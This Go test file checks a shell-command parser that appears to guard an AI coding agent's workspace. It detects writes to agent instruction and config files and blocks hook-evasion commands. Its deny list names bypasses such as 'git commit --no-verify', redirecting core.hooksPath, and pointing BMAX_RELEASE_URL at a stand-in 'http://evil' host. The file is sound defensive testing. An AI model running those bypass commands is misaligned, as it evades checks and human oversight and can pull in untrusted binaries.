package shell

import (
	"reflect"
	"sort"
	"strings"
	"testing"
)

func words(segs []Segment) [][]string {
	var out [][]string
	for _, s := range segs {
		out = append(out, s.Words)
	}
	return out
}

func TestSplit(t *testing.T) {
	cases := []struct {
		cmd  string
		want [][]string
		ok   bool
	}{
		{"cd x && FOO=1 mvn test | tail", [][]string{{"cd", "x"}, {"mvn", "test"}, {"tail"}}, true},
		{`echo "a && b"`, [][]string{{"echo", "a && b"}}, true},
		{"echo 'a; b' ; ls", [][]string{{"echo", "a; b"}, {"ls"}}, true},
		{"a || b; c\nd & e", [][]string{{"a"}, {"b"}, {"c"}, {"d"}, {"e"}}, true},
		{`printf '%s\n' "it's"`, [][]string{{"printf", `%s\n`, "it's"}}, true},
		{`echo a\ b`, [][]string{{"echo", "a b"}}, true},
		{"echo hi # a comment && rm x", [][]string{{"echo", "hi"}}, true},
		{"echo 'unbalanced", [][]string{{"echo", "unbalanced"}}, false},
		{`echo "unbalanced`, [][]string{{"echo", "unbalanced"}}, false},
		{"", nil, true},
		{"  ;  ; ", nil, true},
		{"echo $(date) done", [][]string{{"echo", "$(date)", "done"}, {"date"}}, true},
		{"echo `date`", [][]string{{"echo", "`date`"}, {"date"}}, true},
		{"echo $(echo $(date))", [][]string{{"echo", "$(echo $(date))"}, {"echo", "$(date)"}, {"date"}}, true},
		{"( cd a && make )", [][]string{{"cd", "a"}, {"make"}}, true},
	}
	for _, c := range cases {
		segs, ok := Split(c.cmd)
		if ok != c.ok || !reflect.DeepEqual(words(segs), c.want) {
			t.Errorf("Split(%q) = %v ok=%v; want %v ok=%v", c.cmd, words(segs), ok, c.want, c.ok)
		}
	}
}

func TestSplitAssignmentsAndRedirects(t *testing.T) {
	segs, _ := Split("FOO=1 BAR=2 cmd arg > out.txt 2>&1 >> log.txt 2> err.txt")
	if len(segs) != 1 {
		t.Fatalf("%v", segs)
	}
	s := segs[0]
	if !reflect.DeepEqual(s.Assign, []string{"FOO=1", "BAR=2"}) || !reflect.DeepEqual(s.Words, []string{"cmd", "arg"}) ||
		!reflect.DeepEqual(s.Redirects, []string{"out.txt", "log.txt", "err.txt"}) {
		t.Errorf("%+v", s)
	}
	segs, _ = Split("cmd >out.txt")
	if !reflect.DeepEqual(segs[0].Redirects, []string{"out.txt"}) {
		t.Errorf("glued redirect: %+v", segs[0])
	}
	segs, _ = Split("cmd < in.txt &> both.txt")
	if !reflect.DeepEqual(segs[0].Redirects, []string{"both.txt"}) || !reflect.DeepEqual(segs[0].Words, []string{"cmd"}) {
		t.Errorf("input and &>: %+v", segs[0])
	}
	segs, _ = Split(`echo "x > not a redirect"`)
	if len(segs[0].Redirects) != 0 {
		t.Errorf("quoted > is a redirect: %+v", segs[0])
	}
	segs, _ = Split("cmd >&2; cmd2 2>&-")
	if len(segs[0].Redirects) != 0 || len(segs[1].Redirects) != 0 {
		t.Errorf("fd duplication is not a write: %+v", segs)
	}
}

func TestSplitNestedShells(t *testing.T) {
	segs, ok := Split(`bash -c 'echo hi > AGENTS.md'`)
	if !ok || len(segs) != 2 || !reflect.DeepEqual(segs[1].Redirects, []string{"AGENTS.md"}) {
		t.Fatalf("bash -c: %+v ok=%v", segs, ok)
	}
	segs, _ = Split(`eval "rm -f .agents/bmax.yml"`)
	if len(segs) != 2 || segs[1].Words[0] != "rm" {
		t.Fatalf("eval: %+v", segs)
	}
	segs, _ = Split(`sh -ec "touch a && touch b"`)
	if len(segs) != 3 {
		t.Fatalf("sh -ec: %+v", segs)
	}
}

func TestSplitHeredoc(t *testing.T) {
	cmd := "cat <<'EOF' > notes.txt\necho x > .agents/bmax.yml\nEOF\nls"
	segs, ok := Split(cmd)
	if !ok || len(segs) != 2 {
		t.Fatalf("%+v ok=%v", segs, ok)
	}
	if !reflect.DeepEqual(segs[0].Redirects, []string{"notes.txt"}) || segs[0].Heredoc != "echo x > .agents/bmax.yml" || segs[1].Words[0] != "ls" {
		t.Errorf("heredoc: %+v", segs)
	}
	segs, _ = Split("python3 - <<EOF\nopen('AGENTS.md','w').write('x')\nEOF\n")
	if got := WriteTargets(segs[0]); !reflect.DeepEqual(got, []string{"AGENTS.md", "w", "x"}) {
		t.Errorf("python heredoc literals: %v", got)
	}
	segs, _ = Split("bash <<EOF\necho x > AGENTS.md\nEOF\n")
	found := false
	for _, s := range segs {
		for _, w := range WriteTargets(s) {
			if w == "AGENTS.md" {
				found = true
			}
		}
	}
	if !found {
		t.Errorf("bash heredoc not inspected: %+v", segs)
	}
	segs, _ = Split("cat <<-EOT\n\tbody\n\tEOT\necho after")
	if len(segs) != 2 || segs[1].Words[1] != "after" {
		t.Errorf("<<- : %+v", segs)
	}
	segs, _ = Split("grep x <<< 'here string' > out")
	if !reflect.DeepEqual(segs[0].Words, []string{"grep", "x"}) || !reflect.DeepEqual(segs[0].Redirects, []string{"out"}) {
		t.Errorf("here-string: %+v", segs)
	}
}

func targets(cmd string) []string {
	segs, _ := Split(cmd)
	var out []string
	for _, s := range segs {
		out = append(out, WriteTargets(s)...)
	}
	sort.Strings(out)
	return out
}

func TestWriteTargets(t *testing.T) {
	cases := []struct {
		cmd  string
		want []string
	}{
		{"echo x > AGENTS.md", []string{"AGENTS.md"}},
		{"echo x >> docs/adr/0001.md", []string{"docs/adr/0001.md"}},
		{"echo x | tee -a a.txt b.txt", []string{"a.txt", "b.txt"}},
		{"sed -i 's/a/b/' AGENTS.md", []string{"AGENTS.md", "s/a/b/"}},
		{"sed -i.bak -e 's/a/b/' x.yml", []string{"s/a/b/", "x.yml"}},
		{"sed 's/a/b/' AGENTS.md", nil},
		{"perl -pi -e 's/a/b/' .agents/bmax.yml", []string{".agents/bmax.yml", "s/a/b/"}},
		{"cp a b", []string{"b", "b/a"}},
		{"cp -t dest/ a b", []string{"dest/", "dest/a", "dest/b"}},
		{"mv a AGENTS.md", []string{"AGENTS.md", "AGENTS.md/a", "a"}},
		{"rm -f .agents/bmax.lock", []string{".agents/bmax.lock"}},
		{"rm -rf docs/adr", []string{"docs/adr"}},
		{"ln -s x.yml .agents/bmax.yml", []string{".agents/bmax.yml", ".agents/bmax.yml/x.yml"}},
		{"install -m 644 src dst", []string{"dst", "dst/src"}},
		{"truncate -s0 .agents/baselines/lint.tsv", []string{".agents/baselines/lint.tsv"}},
		{"touch CLAUDE.md", []string{"CLAUDE.md"}},
		{"chmod -x .agents/bin/bmax", []string{".agents/bin/bmax"}},
		{"git checkout -- AGENTS.md", []string{"AGENTS.md"}},
		{"git checkout HEAD -- docs/review.md", []string{"HEAD", "docs/review.md"}},
		{"git restore .claude/settings.json", []string{".claude/settings.json"}},
		{"git reset HEAD AGENTS.md", []string{"AGENTS.md", "HEAD"}},
		{"git apply fix.patch", []string{"fix.patch"}},
		{"git rm AGENTS.md", []string{"AGENTS.md"}},
		{"git -C sub status", nil},
		{`python -c "open('AGENTS.md','w').write('x')"`, []string{"AGENTS.md", "w", "x"}},
		{`python3 -c 'import os; os.remove("docs/adr/0001.md")'`, []string{"docs/adr/0001.md"}},
		{`node -e "require('fs').writeFileSync('.agents/bmax.yml','')"`, []string{".agents/bmax.yml", "fs"}},
		{`perl -e 'unlink ".agents/bmax.lock"'`, []string{".agents/bmax.lock"}},
		{`ruby -e "File.write('CLAUDE.md', '')"`, []string{"CLAUDE.md"}},
		{"dd if=/dev/zero of=AGENTS.md", []string{"AGENTS.md"}},
		{"curl -o AGENTS.md https://x", []string{"AGENTS.md"}},
		{"ls -la", nil},
		{"cat AGENTS.md", nil},
		{"grep -r foo docs", nil},
		{"npm test", nil},
	}
	for _, c := range cases {
		got := targets(c.cmd)
		want := append([]string(nil), c.want...)
		sort.Strings(want)
		if len(got) == 0 && len(want) == 0 {
			continue
		}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("%q\n  got  %q\n  want %q", c.cmd, got, want)
		}
	}
}

func TestPatchTargets(t *testing.T) {
	patch := "diff --git a/AGENTS.md b/AGENTS.md\n--- a/AGENTS.md\n+++ b/AGENTS.md\n@@ -1 +1 @@\n-x\n+y\n--- /dev/null\n+++ b/new file.md\n"
	got := PatchTargets(patch)
	if !reflect.DeepEqual(got, []string{"AGENTS.md", "AGENTS.md", "new file.md"}) {
		t.Errorf("got %q", got)
	}
}

func forbidden(cmd string) (string, bool) {
	segs, _ := Split(cmd)
	for _, s := range segs {
		if r, ok := Forbidden(s); ok {
			return r, true
		}
	}
	return "", false
}

func TestForbidden(t *testing.T) {
	deny := []string{
		"git commit -n -m x",
		"git commit --no-verify -m x",
		"git commit -nm 'x'",
		"git commit -an",
		"git push --no-verify",
		"git push origin main --no-verify",
		"git -C other commit -n",
		"git config core.hooksPath /tmp/x",
		"git config --global core.hooksPath x",
		"git config --unset core.hooksPath",
		"git -c core.hooksPath=/dev/null commit -m x",
		"git update-index --skip-worktree AGENTS.md",
		"git update-index --assume-unchanged f",
		"BMAX_BINARY=/tmp/x sh .agents/bin/bmax gate fast",
		"BMAX_RELEASE_URL=http://evil sh .agents/bin/bmax setup",
		"env BMAX_BINARY=/tmp/x sh .agents/bin/bmax gate fast",
		"export BMAX_BINARY=/tmp/x && sh .agents/bin/bmax gate fast",
		"cd x && git commit --no-verify -m y",
	}
	for _, c := range deny {
		if r, ok := forbidden(c); !ok || r == "" {
			t.Errorf("%q should be forbidden", c)
		}
	}
	allow := []string{
		"git commit -m 'fix: nothing'",
		"git commit -am 'x'",
		"git commit --amend --no-edit",
		"git push -n",
		"git config user.name x",
		"git update-index --refresh",
		"git status",
		"echo BMAX_BINARY",
		"sh .agents/bin/bmax gate fast",
		"npm test -- --no-verify-ssl",
	}
	for _, c := range allow {
		if r, ok := forbidden(c); ok {
			t.Errorf("%q should be allowed, got %q", c, r)
		}
	}
}

func TestSignature(t *testing.T) {
	cases := map[string]string{
		"./gradlew test":               "gradlew",
		"gradlew test":                 "gradlew",
		"/usr/bin/mvn -q verify":       "mvn",
		"npx eslint src":               "eslint",
		"npx --yes prettier --check .": "prettier",
		"pnpm exec eslint .":           "eslint",
		"pnpm test":                    "pnpm test",
		"pnpm install":                 "pnpm install",
		"npm run lint -- --fix":        "npm run lint",
		"yarn test":                    "yarn test",
		"bunx vitest":                  "vitest",
		"python -m pytest":             "python -m pytest",
		"python3 -m pytest -q":         "python3 -m pytest",
		"python tools/check.py":        "python tools/check.py",
		"make lint":                    "make lint",
		"make -j4 test":                "make test",
		"uv run pytest -k x":           "uv run pytest",
		"poetry run ruff check":        "poetry run ruff",
		"pipenv run mypy":              "pipenv run mypy",
		"bundle exec rspec":            "bundle exec rspec",
		"go run ./cmd/tool":            "go run cmd/tool",
		"go test ./...":                "go",
		"bash scripts/x.sh":            "bash scripts/x.sh",
		"sh ./scripts/x.sh":            "sh scripts/x.sh",
		"pytest tests":                 "pytest",
		"cd x":                         "",
		"export A=1":                   "",
		"echo hi":                      "",
		"FOO=1 BAR=2 mvn test":         "mvn",
		"node scripts/gen.js":          "node scripts/gen.js",
		"":                             "",
	}
	for cmd, want := range cases {
		segs, _ := Split(cmd)
		got := ""
		if len(segs) > 0 {
			got = Signature(segs[0])
		}
		if got != want {
			t.Errorf("Signature(%q) = %q, want %q", cmd, got, want)
		}
	}
}

func TestRunSignature(t *testing.T) {
	if got := RunSignature("cd app && npx vitest run --reporter=junit | tee out.txt"); got != "vitest" {
		t.Errorf("got %q", got)
	}
	if got := RunSignature("echo start; ./gradlew test"); got != "gradlew" {
		t.Errorf("got %q", got)
	}
	if got := RunSignature(""); got != "" {
		t.Errorf("got %q", got)
	}
}

func TestPathsWithSpacesAndDashStayOneWord(t *testing.T) {
	segs, _ := Split(`cp 'docs/My ADR.md' -- "-rf.md"`)
	if !reflect.DeepEqual(segs[0].Words, []string{"cp", "docs/My ADR.md", "--", "-rf.md"}) {
		t.Errorf("%q", segs[0].Words)
	}
	if got := strings.Join(WriteTargets(segs[0]), "|"); got != "-rf.md|-rf.md/My ADR.md" {
		t.Errorf("targets = %q", got)
	}
	segs, _ = Split(`mv "docs/My ADR.md" ../old`)
	if got := WriteTargets(segs[0]); !reflect.DeepEqual(got, []string{"docs/My ADR.md", "../old", "../old/My ADR.md"}) {
		t.Errorf("mv targets = %q", got)
	}
}

func TestInfoOnly(t *testing.T) {
	cases := map[string]bool{
		"gitleaks version": true, "gitleaks dir --help": true, "npx tsc --version": true, "tsc -h": true, "gitleaks help detect": true,
		"gitleaks detect --no-git": false, "npx tsc --noEmit": false, "gitleaks": false, "make versions": false,
	}
	for cmd, want := range cases {
		segs, _ := Split(cmd)
		if got := InfoOnly(segs[0]); got != want {
			t.Errorf("InfoOnly(%q) = %v, want %v", cmd, got, want)
		}
	}
}
